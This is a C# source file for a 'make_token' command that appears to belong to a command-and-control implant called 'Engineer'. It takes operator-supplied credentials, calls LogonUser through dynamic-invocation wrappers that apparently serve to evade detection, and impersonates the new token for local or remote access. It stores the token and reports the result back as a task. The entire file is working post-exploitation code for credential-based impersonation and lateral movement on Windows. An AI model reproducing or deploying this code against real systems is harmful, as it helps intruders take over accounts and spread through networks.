using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;
using DynamicEngLoading;
using static DynamicEngLoading.h_DynInv.Win32.Advapi32;


namespace Engineer.Commands
{
    internal class Make_Token : EngineerCommand
    {
        ////DEBUG TESTING 
        //[DllImport("advapi32.dll")]
        //public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, h_DynInv.Win32.Advapi32.LOGON_TYPE dwlogonType, h_DynInv.Win32.Advapi32.LOGON_PROVIDER dwlogonProvider, out IntPtr phToken);

        //[DllImport("advapi32.dll")]
        //public static extern bool RevertToSelf();

        //[DllImport("Advapi32.dll")]
        //public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
        ////END DEBUG TESTING

        public override string Name => "make_token";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                if (task.Arguments.TryGetValue("/username", out string username))
                {
                    username = username.Trim();
                }
                if (task.Arguments.TryGetValue("/password", out string password))
                {
                    password = password.Trim();
                }
                if (task.Arguments.TryGetValue("/domain", out string domain))
                {
                    domain = domain.Trim();
                }

                if(task.Arguments.ContainsKey("/localauth"))
                {
                    if (h_DynInv_Methods.AdvApi32FuncWrapper.LogonUser(username, domain, password, h_DynInv.Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_INTERACTIVE, h_DynInv.Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken_local))
                    {
                        if (h_DynInv_Methods.AdvApi32FuncWrapper.ImpersonateLoggedOnUser(hToken_local))
                        {
                            WindowsIdentity identity = new WindowsIdentity(hToken_local);
                            try
                            {
                                //string userdomain = $"{domain}\\{username}";
                                identity.Impersonate();
                                Program.ImpersonatedUser = identity;
                                Program.ImpersonatedUserChanged = true;
                                token_store.AddTokenToStore(hToken_local, Process.GetCurrentProcess().Id);
                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Successfully impersonated {identity.Name} for local and remote access, use the remove profile command when done", task, EngTaskStatus.Complete, TaskResponseType.String);
                                return;
                            }
                            catch (Exception ex)
                            {
                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
                                return;
                            }
                        }
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "created token but Failed to imersonate user", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                        return;
                    }
                    else
                    {
                        uint lasterror = h_DynInv_Methods.Ker32FuncWrapper.GetLastError();
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Failed to make interactive logon token, error code {lasterror} ", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                        return; 
                    }
                }

                if (h_DynInv_Methods.AdvApi32FuncWrapper.LogonUser(username, domain, password, h_DynInv.Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, h_DynInv.Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken))
                //if (LogonUser(username, domain, password, h_DynInv.Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, h_DynInv.Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken))
                {
                    if (h_DynInv_Methods.AdvApi32FuncWrapper.ImpersonateLoggedOnUser(hToken))
                    //if (ImpersonateLoggedOnUser(hToken))
                    {
                        WindowsIdentity identity = new WindowsIdentity(hToken);
                        try
                        {
                            string userdomain = $"{domain}\\{username}";
                            identity.Impersonate();
                            Program.ImpersonatedUser = identity;
                            Program.ImpersonatedUserChanged = true;
                            token_store.AddTokenToStore(hToken, Process.GetCurrentProcess().Id,userdomain);
                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Successfully impersonated {userdomain} for remote access, still {identity.Name} locally", task, EngTaskStatus.Complete, TaskResponseType.String);
                            return;
                        }
                        catch (Exception ex)
                        {
                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
                            return;
                        }
                    }
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "created token but Failed to impersonate user", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                    return;
                }
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to make token", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
                return;
            }
            
        }
    }
}
